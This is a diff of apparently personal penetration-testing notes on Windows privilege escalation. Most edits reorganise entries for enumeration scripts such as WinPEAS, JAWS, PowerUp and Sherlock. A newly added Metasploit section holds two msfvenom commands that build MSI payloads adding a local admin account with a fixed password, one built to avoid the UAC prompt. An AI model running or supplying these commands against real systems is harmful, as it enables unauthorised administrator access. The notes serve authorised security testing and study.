@@ -17,12 +17,15 @@ ___
 ## Enumeration Scripts
 
 > [!warning]
+>
 > Running enumeration scripts can generate
 > a significant amount of "noise",
-> **potentially triggering anti-virus** or **security monitoring software**.
+> **potentially triggering anti-virus** or **security monitoring software**
 >
-> In some cases, it may be preferable to conduct manual enumeration
-> instead.
+> > [!tip]
+> >
+> > In some cases, it may be preferable
+> > to conduct manual enumeration instead
 
 <!-- WinPEAS-ng {{{-->
 ### WinPEAS-ng
@@ -62,42 +65,57 @@ on Windows Systems (*by [Pentestmonkey](https://pentestmonkey.net/)*)
 
 <!-- }}} -->
 
+<!-- JAWS {{{-->
+### JAWS
+
+[JAWS](https://github.com/411Hall/JAWS) —
+Just Another Windows (*Enum*) Script
+
+> [!warning] DEPRECATED
+
+<!-- }}} -->
+
 <!-- PowerSploit {{{-->
 ### PowerSploit
-
-> [!warning]
->
-> **DEPRECATED**
 
 [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) —
 PowerShell script to enumerate privilege escalation vectors
 
-<!-- }}} -->
-
-<!-- JAWS {{{-->
-### JAWS
-
-> [!warning]
->
-> **DEPRECATED**
-
-[JAWS](https://github.com/411Hall/JAWS) —
-Just Another Windows (*Enum*) Script
+> [!warning] DEPRECATED
 
 <!-- }}} -->
 
 <!-- Sherlock {{{-->
 ### Sherlock
 
-> [!warning]
->
-> **DEPRECATED**
-
 [Sherlock](https://github.com/rasta-mouse/Sherlock) —
 PowerShell script to quickly find missing software patches
 for local privilege escalation vulnerabilities
 
+> [!warning] DEPRECATED
+
 <!-- }}} -->
 
 ___
+<!-- }}} -->
+
+<!-- Metasploit {{{-->
+## Metasploit
+
+> [!todo]
+
+[[Metasploit]]
+
+No UAC format
+
+```sh
+msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi
+```
+
+Using the `msiexec` the UAC wont be prompted
+
+```sh
+msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi
+```
+
 <!-- }}} -->
